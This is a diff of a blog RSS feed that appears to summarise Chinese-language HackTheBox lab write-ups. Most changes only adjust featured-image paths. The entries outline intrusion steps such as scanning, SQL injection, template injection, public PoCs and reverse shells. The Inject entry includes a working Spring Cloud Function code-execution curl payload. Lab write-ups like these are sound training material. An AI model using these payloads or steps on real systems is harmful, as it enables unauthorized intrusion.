+        <description>&lt;img src="https://nergigantes.github.io/22.jpg" alt="Featured image of post RedPanda" /&gt;&lt;p&gt;网站打开，搜索功能&lt;/p&gt;
 &lt;p&gt;网站源代码有 Spring boot的提示&lt;/p&gt;
 &lt;p&gt;猜测为ssti模板注入&lt;/p&gt;
 &lt;p&gt;用收集的java spring playload试一试&lt;/p&gt;
@@ -2781,7 +3130,7 @@ Message signing enabled and required：这表示消息签名已启用并且是�
         <pubDate>Wed, 19 Mar 2025 16:38:28 +0800</pubDate>
         
         <guid>https://nergigantes.github.io/htb/sau/</guid>
-        <description>&lt;img src="https://nergigantes.github.io/htb/sau/2.jpg" alt="Featured image of post Sau" /&gt;&lt;p&gt;拿到网站扫描端口&lt;/p&gt;
+        <description>&lt;img src="https://nergigantes.github.io/2.jpg" alt="Featured image of post Sau" /&gt;&lt;p&gt;拿到网站扫描端口&lt;/p&gt;
 &lt;p&gt;22，80，55555&lt;/p&gt;
 &lt;p&gt;80打不开，55555端口跳转的web目录，得知该网站服务器是&lt;/p&gt;
 &lt;p&gt;&lt;font style=&#34;color:rgb(240, 246, 252);&#34;&gt; &lt;/font&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/darklynx/request-baskets&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
@@ -2833,7 +3182,7 @@ Message signing enabled and required：这表示消息签名已启用并且是�
         <pubDate>Wed, 19 Mar 2025 16:38:28 +0800</pubDate>
         
         <guid>https://nergigantes.github.io/htb/secret/</guid>
-        <description>&lt;img src="https://nergigantes.github.io/htb/secret/3.jpg" alt="Featured image of post Secret" /&gt;&lt;p&gt;页面下载源文件&lt;/p&gt;
+        <description>&lt;img src="https://nergigantes.github.io/3.jpg" alt="Featured image of post Secret" /&gt;&lt;p&gt;页面下载源文件&lt;/p&gt;
 &lt;p&gt;有.git&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://nergigantes.github.io/htb/secret/1733748867342-b03107da-43b9-4abb-8679-464addea1c5c.png&#34;
 	width=&#34;1336&#34;
@@ -2884,7 +3233,7 @@ Message signing enabled and required：这表示消息签名已启用并且是�
         <pubDate>Wed, 19 Mar 2025 16:38:28 +0800</pubDate>
         
         <guid>https://nergigantes.github.io/htb/shocker/</guid>
-        <description>&lt;img src="https://nergigantes.github.io/htb/shocker/13.jpg" alt="Featured image of post Shocker" /&gt;&lt;h1 id=&#34;寻找立足点&#34;&gt;寻找立足点
+        <description>&lt;img src="https://nergigantes.github.io/13.jpg" alt="Featured image of post Shocker" /&gt;&lt;h1 id=&#34;寻找立足点&#34;&gt;寻找立足点
 &lt;/h1&gt;&lt;p&gt;扫描端口没有发现，打开网站同样&lt;/p&gt;
 &lt;p&gt;进行目录爆破&lt;/p&gt;
 &lt;p&gt;扫到了/cgi-bin&lt;/p&gt;
@@ -2915,7 +3264,7 @@ Message signing enabled and required：这表示消息签名已启用并且是�
         <pubDate>Wed, 19 Mar 2025 16:38:28 +0800</pubDate>
         
         <guid>https://nergigantes.github.io/htb/shoppy/</guid>
-        <description>&lt;img src="https://nergigantes.github.io/htb/shoppy/7.jpg" alt="Featured image of post Shoppy" /&gt;&lt;p&gt;端口正常，有域名扫子域名&lt;/p&gt;
+        <description>&lt;img src="https://nergigantes.github.io/7.jpg" alt="Featured image of post Shoppy" /&gt;&lt;p&gt;端口正常，有域名扫子域名&lt;/p&gt;
 &lt;p&gt;我用的11w的字典扫不到&lt;strong&gt;mattermost&lt;/strong&gt;这个字段？？&lt;/p&gt;
 &lt;p&gt;存在login登录界面&lt;/p&gt;
 &lt;p&gt;sql注入试一下&lt;/p&gt;
@@ -2977,7 +3326,7 @@ Message signing enabled and required：这表示消息签名已启用并且是�
         <pubDate>Wed, 19 Mar 2025 16:38:28 +0800</pubDate>
         
         <guid>https://nergigantes.github.io/htb/solidstate/</guid>
-        <description>&lt;img src="https://nergigantes.github.io/htb/solidstate/19.jpg" alt="Featured image of post SolidState" /&gt;&lt;p&gt;&lt;font style=&#34;color:rgb(36, 36, 36);background-color:rgb(249, 249, 249);&#34;&gt;JAMES 2.3.2&lt;/font&gt;&lt;/p&gt;
+        <description>&lt;img src="https://nergigantes.github.io/19.jpg" alt="Featured image of post SolidState" /&gt;&lt;p&gt;&lt;font style=&#34;color:rgb(36, 36, 36);background-color:rgb(249, 249, 249);&#34;&gt;JAMES 2.3.2&lt;/font&gt;&lt;/p&gt;
 &lt;p&gt;&lt;font style=&#34;color:rgb(36, 36, 36);background-color:rgb(249, 249, 249);&#34;&gt;存在root/root&lt;/font&gt;&lt;/p&gt;
 &lt;p&gt;&lt;font style=&#34;color:rgb(36, 36, 36);background-color:rgb(249, 249, 249);&#34;&gt;&lt;/font&gt;&lt;/p&gt;
 &lt;p&gt;扫全部端口4555改密码&lt;/p&gt;
@@ -3018,7 +3367,7 @@ Message signing enabled and required：这表示消息签名已启用并且是�
         <pubDate>Wed, 19 Mar 2025 16:38:28 +0800</pubDate>
         
         <guid>https://nergigantes.github.io/htb/stocker/</guid>
-        <description>&lt;img src="https://nergigantes.github.io/htb/stocker/18.jpg" alt="Featured image of post Stocker" /&gt;&lt;h1 id=&#34;寻找立足点&#34;&gt;寻找立足点
+        <description>&lt;img src="https://nergigantes.github.io/18.jpg" alt="Featured image of post Stocker" /&gt;&lt;h1 id=&#34;寻找立足点&#34;&gt;寻找立足点
 &lt;/h1&gt;&lt;p&gt;端口无发现。有域名扫子域名发现一个dev&lt;/p&gt;
 &lt;p&gt;主网站目录扫描无发现&lt;/p&gt;
 &lt;p&gt;进入子域名让我们登录&lt;/p&gt;
@@ -3107,7 +3456,7 @@ Message signing enabled and required：这表示消息签名已启用并且是�
         <pubDate>Wed, 19 Mar 2025 16:38:27 +0800</pubDate>
         
         <guid>https://nergigantes.github.io/htb/analytics/</guid>
-        <description>&lt;img src="https://nergigantes.github.io/htb/analytics/20.jpg" alt="Featured image of post Analytics" /&gt;&lt;h1 id=&#34;寻找立足点&#34;&gt;寻找立足点
+        <description>&lt;img src="https://nergigantes.github.io/20.jpg" alt="Featured image of post Analytics" /&gt;&lt;h1 id=&#34;寻找立足点&#34;&gt;寻找立足点
 &lt;/h1&gt;&lt;p&gt;扫描端口正常1，有域名扫子域名正常，目录爆破也没东西&lt;/p&gt;
 &lt;p&gt;在登录页面看到是matebases&lt;/p&gt;
 &lt;p&gt;msf存在可以利用漏洞&lt;/p&gt;
@@ -3136,7 +3485,7 @@ Message signing enabled and required：这表示消息签名已启用并且是�
         <pubDate>Wed, 19 Mar 2025 16:38:27 +0800</pubDate>
         
         <guid>https://nergigantes.github.io/htb/armageddon/</guid>
-        <description>&lt;img src="https://nergigantes.github.io/htb/armageddon/22.jpg" alt="Featured image of post Armageddon" /&gt;&lt;h1 id=&#34;寻找立足点&#34;&gt;寻找立足点
+        <description>&lt;img src="https://nergigantes.github.io/22.jpg" alt="Featured image of post Armageddon" /&gt;&lt;h1 id=&#34;寻找立足点&#34;&gt;寻找立足点
 &lt;/h1&gt;&lt;p&gt;扫端口正常，无域名，扫目录&lt;/p&gt;
 &lt;p&gt;一个CHANGELOGO路径下的文件显示了是一个是Drupal 7.56的版本&lt;/p&gt;
 &lt;p&gt;存在CVE-2018-7600,&lt;/p&gt;
@@ -3264,7 +3613,7 @@ Message signing enabled and required：这表示消息签名已启用并且是�
         <pubDate>Wed, 19 Mar 2025 16:38:27 +0800</pubDate>
         
         <guid>https://nergigantes.github.io/htb/bashed/</guid>
-        <description>&lt;img src="https://nergigantes.github.io/htb/bashed/1.jpg" alt="Featured image of post Bashed" /&gt;&lt;h1 id=&#34;寻找立足点&#34;&gt;寻找立足点
+        <description>&lt;img src="https://nergigantes.github.io/1.jpg" alt="Featured image of post Bashed" /&gt;&lt;h1 id=&#34;寻找立足点&#34;&gt;寻找立足点
 &lt;/h1&gt;&lt;p&gt;nmap扫描端口，只有一个80&lt;/p&gt;
 &lt;p&gt;打开网页dirsearch扫下目录，dev路径下有伪shell&lt;/p&gt;
 &lt;p&gt;尝试反向shell&lt;/p&gt;
@@ -3378,7 +3727,7 @@ Message signing enabled and required：这表示消息签名已启用并且是�
         <pubDate>Wed, 19 Mar 2025 16:38:27 +0800</pubDate>
         
         <guid>https://nergigantes.github.io/htb/blocky/</guid>
-        <description>&lt;img src="https://nergigantes.github.io/htb/blocky/6.jpg" alt="Featured image of post Blocky" /&gt;&lt;p&gt;端口扫描，有域名子域名爆破，目录扫描&lt;/p&gt;
+        <description>&lt;img src="https://nergigantes.github.io/6.jpg" alt="Featured image of post Blocky" /&gt;&lt;p&gt;端口扫描，有域名子域名爆破，目录扫描&lt;/p&gt;
 &lt;p&gt;在&lt;/p&gt;
 &lt;p&gt;/plugins&lt;/p&gt;
 &lt;p&gt;目录下发现俩个Jar包，解码一个包拿到一个密码&lt;/p&gt;
@@ -3420,7 +3769,7 @@ Message signing enabled and required：这表示消息签名已启用并且是�
         <pubDate>Wed, 19 Mar 2025 16:38:27 +0800</pubDate>
         
         <guid>https://nergigantes.github.io/htb/bountyhunter/</guid>
-        <description>&lt;img src="https://nergigantes.github.io/htb/bountyhunter/20.jpg" alt="Featured image of post BountyHunter" /&gt;&lt;p&gt;扫描端口正常网页打开找到一个输入的点&lt;/p&gt;
+        <description>&lt;img src="https://nergigantes.github.io/20.jpg" alt="Featured image of post BountyHunter" /&gt;&lt;p&gt;扫描端口正常网页打开找到一个输入的点&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://nergigantes.github.io/htb/bountyhunter/1726388076210-f9409615-3cb8-4492-b8a1-349b230b3937.png&#34;
 	width=&#34;1149&#34;
 	height=&#34;674&#34;
@@ -3501,7 +3850,7 @@ Message signing enabled and required：这表示消息签名已启用并且是�
         <pubDate>Wed, 19 Mar 2025 16:38:27 +0800</pubDate>
         
         <guid>https://nergigantes.github.io/htb/broker%E6%9C%AA%E5%AE%8C/</guid>
-        <description>&lt;img src="https://nergigantes.github.io/htb/broker%E6%9C%AA%E5%AE%8C/26.jpg" alt="Featured image of post Broker（未完）" /&gt;&lt;h1 id=&#34;寻找立足点&#34;&gt;寻找立足点
+        <description>&lt;img src="https://nergigantes.github.io/26.jpg" alt="Featured image of post Broker（未完）" /&gt;&lt;h1 id=&#34;寻找立足点&#34;&gt;寻找立足点
 &lt;/h1&gt;&lt;p&gt;简单爆破admin:adminin&lt;/p&gt;
 &lt;p&gt;进入后台发现服务器版本ActiveMQ 5.15.15&lt;/p&gt;
 &lt;p&gt;搜索poc&lt;/p&gt;
@@ -3518,7 +3867,7 @@ Message signing enabled and required：这表示消息签名已启用并且是�
         <pubDate>Wed, 19 Mar 2025 16:38:27 +0800</pubDate>
         
         <guid>https://nergigantes.github.io/htb/busqueda/</guid>
-        <description>&lt;img src="https://nergigantes.github.io/htb/busqueda/5.jpg" alt="Featured image of post Busqueda" /&gt;&lt;h1 id=&#34;寻找立足点&#34;&gt;寻找立足点
+        <description>&lt;img src="https://nergigantes.github.io/5.jpg" alt="Featured image of post Busqueda" /&gt;&lt;h1 id=&#34;寻找立足点&#34;&gt;寻找立足点
 &lt;/h1&gt;&lt;p&gt;扫描端口正常的几个端口，网站打开下来发现版本是search 2.4.0&lt;/p&gt;
 &lt;p&gt;网上搜索poc直接反弹shell&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
@@ -3549,7 +3898,7 @@ Message signing enabled and required：这表示消息签名已启用并且是�
         <pubDate>Wed, 19 Mar 2025 16:38:27 +0800</pubDate>
         
         <guid>https://nergigantes.github.io/htb/codify/</guid>
-        <description>&lt;img src="https://nergigantes.github.io/htb/codify/2.jpg" alt="Featured image of post Codify" /&gt;&lt;h1 id=&#34;寻找立足点&#34;&gt;寻找立足点
+        <description>&lt;img src="https://nergigantes.github.io/2.jpg" alt="Featured image of post Codify" /&gt;&lt;h1 id=&#34;寻找立足点&#34;&gt;寻找立足点
 &lt;/h1&gt;&lt;p&gt;扫描端口正常，有域名爆子域名无发现，目录扫描无发现&lt;/p&gt;
 &lt;p&gt;打开网页发现能够执行js代码&lt;/p&gt;
 &lt;p&gt;找一段反弹shell代码执行进入&lt;/p&gt;
@@ -3664,7 +4013,7 @@ Message signing enabled and required：这表示消息签名已启用并且是�
         <pubDate>Wed, 19 Mar 2025 16:38:27 +0800</pubDate>
         
         <guid>https://nergigantes.github.io/htb/cozyhosting/</guid>
-        <description>&lt;img src="https://nergigantes.github.io/htb/cozyhosting/17.jpg" alt="Featured image of post CozyHosting" /&gt;&lt;h1 id=&#34;寻找立足点&#34;&gt;寻找立足点
+        <description>&lt;img src="https://nergigantes.github.io/17.jpg" alt="Featured image of post CozyHosting" /&gt;&lt;h1 id=&#34;寻找立足点&#34;&gt;寻找立足点
 &lt;/h1&gt;&lt;p&gt;nmap扫描，目录爆破，存在域名加上子域名扫描&lt;/p&gt;
 &lt;p&gt;端口，子域名无发现&lt;/p&gt;
 &lt;p&gt;目录爆破找到一个接口/actuator&lt;/p&gt;
@@ -3724,7 +4073,7 @@ Message signing enabled and required：这表示消息签名已启用并且是�
         <pubDate>Wed, 19 Mar 2025 16:38:27 +0800</pubDate>
         
         <guid>https://nergigantes.github.io/htb/cronos/</guid>
-        <description>&lt;img src="https://nergigantes.github.io/htb/cronos/9.jpg" alt="Featured image of post Cronos" /&gt;&lt;h1 id=&#34;寻找立足点&#34;&gt;寻找立足点
+        <description>&lt;img src="https://nergigantes.github.io/9.jpg" alt="Featured image of post Cronos" /&gt;&lt;h1 id=&#34;寻找立足点&#34;&gt;寻找立足点
 &lt;/h1&gt;&lt;p&gt;端口，域名，目录三件套&lt;/p&gt;
 &lt;p&gt;网站进去是appech的配置默认页面，没有发现啥&lt;/p&gt;
 &lt;p&gt;这次没有给域名，根据htb的经验是cronos.htb&lt;/p&gt;
@@ -3783,7 +4132,7 @@ Message signing enabled and required：这表示消息签名已启用并且是�
         <pubDate>Wed, 19 Mar 2025 16:38:27 +0800</pubDate>
         
         <guid>https://nergigantes.github.io/htb/curling/</guid>
-        <description>&lt;img src="https://nergigantes.github.io/htb/curling/6.jpg" alt="Featured image of post Curling" /&gt;&lt;h1 id=&#34;寻找立足点&#34;&gt;寻找立足点
+        <description>&lt;img src="https://nergigantes.github.io/6.jpg" alt="Featured image of post Curling" /&gt;&lt;h1 id=&#34;寻找立足点&#34;&gt;寻找立足点
 &lt;/h1&gt;&lt;p&gt;端口，域名，目录&lt;/p&gt;
 &lt;p&gt;网页源代码最下面有个提示sercet.txt&lt;/p&gt;
 &lt;p&gt;打开是个base64解码 “Curling2018!”&lt;/p&gt;
@@ -3837,7 +4186,7 @@ Message signing enabled and required：这表示消息签名已启用并且是�
         <pubDate>Wed, 19 Mar 2025 16:38:27 +0800</pubDate>
         
         <guid>https://nergigantes.github.io/htb/devvortex/</guid>
-        <description>&lt;img src="https://nergigantes.github.io/htb/devvortex/19.jpg" alt="Featured image of post Devvortex" /&gt;&lt;p&gt;寻找立足点&lt;/p&gt;
+        <description>&lt;img src="https://nergigantes.github.io/19.jpg" alt="Featured image of post Devvortex" /&gt;&lt;p&gt;寻找立足点&lt;/p&gt;
 &lt;p&gt;拿到ip扫端口&lt;/p&gt;
 &lt;p&gt;开了俩22，80&lt;/p&gt;
 &lt;p&gt;浏览器打开未发现信息，使用gobuster扫描子域名，有dev，加入hosts文件打开&lt;/p&gt;
@@ -3906,7 +4255,7 @@ Message signing enabled and required：这表示消息签名已启用并且是�
         <pubDate>Wed, 19 Mar 2025 16:38:27 +0800</pubDate>
         
         <guid>https://nergigantes.github.io/htb/forge/</guid>
-        <description>&lt;img src="https://nergigantes.github.io/htb/forge/16.jpg" alt="Featured image of post Forge" /&gt;&lt;h1 id=&#34;外网打点&#34;&gt;外网打点
+        <description>&lt;img src="https://nergigantes.github.io/16.jpg" alt="Featured image of post Forge" /&gt;&lt;h1 id=&#34;外网打点&#34;&gt;外网打点
 &lt;/h1&gt;&lt;p&gt;扫端口，有域名扫子域名，扫目录&lt;/p&gt;
 &lt;p&gt;打开网址&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://nergigantes.github.io/htb/forge/1741503924490-3e975224-41fb-4eb1-9628-4956bf9874f9.png&#34;
@@ -3992,7 +4341,7 @@ Message signing enabled and required：这表示消息签名已启用并且是�
         <pubDate>Wed, 19 Mar 2025 16:38:27 +0800</pubDate>
         
         <guid>https://nergigantes.github.io/htb/horizontall/</guid>
-        <description>&lt;img src="https://nergigantes.github.io/htb/horizontall/2.jpg" alt="Featured image of post Horizontall" /&gt;&lt;h1 id=&#34;寻找立足点&#34;&gt;寻找立足点
+        <description>&lt;img src="https://nergigantes.github.io/2.jpg" alt="Featured image of post Horizontall" /&gt;&lt;h1 id=&#34;寻找立足点&#34;&gt;寻找立足点
 &lt;/h1&gt;&lt;p&gt;扫描端口正常，打开网页添加域名，该域名下无任何发现，扫一下目录和子域名&lt;/p&gt;
 &lt;p&gt;扫到一个子域名api-prod打开是一个Strapi MCS框架的网页，在admin/init路径下发现具体版本，网上搜索poc反弹shell拿到立足点&lt;/p&gt;
 &lt;h1 id=&#34;权限提升&#34;&gt;权限提升
@@ -4006,7 +4355,7 @@ Message signing enabled and required：这表示消息签名已启用并且是�
         <pubDate>Wed, 19 Mar 2025 16:38:27 +0800</pubDate>
         
         <guid>https://nergigantes.github.io/htb/inject/</guid>
-        <description>&lt;img src="https://nergigantes.github.io/htb/inject/21.jpg" alt="Featured image of post Inject" /&gt;&lt;h1 id=&#34;立足点&#34;&gt;立足点
+        <description>&lt;img src="https://nergigantes.github.io/21.jpg" alt="Featured image of post Inject" /&gt;&lt;h1 id=&#34;立足点&#34;&gt;立足点
 &lt;/h1&gt;&lt;p&gt;curl -X POST  http://0.0.0.0:8080/functionRouter -H &amp;lsquo;spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(&amp;ldquo;touch /tmp/pwned&amp;rdquo;)&amp;rsquo; &amp;ndash;data-raw &amp;lsquo;data&amp;rsquo; -v&lt;/p&gt;
 &lt;h1 id=&#34;权限提升&#34;&gt;权限提升
 &lt;/h1&gt;&lt;p&gt;pspy64看系统进程&lt;/p&gt;
@@ -4030,7 +4379,7 @@ Message signing enabled and required：这表示消息签名已启用并且是�
         <pubDate>Wed, 19 Mar 2025 16:38:27 +0800</pubDate>
         
         <guid>https://nergigantes.github.io/htb/jarvis/</guid>
-        <description>&lt;img src="https://nergigantes.github.io/htb/jarvis/27.jpg" alt="Featured image of post Jarvis" /&gt;&lt;p&gt;要点：&lt;/p&gt;
+        <description>&lt;img src="https://nergigantes.github.io/27.jpg" alt="Featured image of post Jarvis" /&gt;&lt;p&gt;要点：&lt;/p&gt;
 &lt;p&gt;在网页找到sql注入点&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://nergigantes.github.io/htb/jarvis/1734009048604-0b790066-350a-427a-a1a8-d34e01a4c5c6.png&#34;
 	width=&#34;2513&#34;
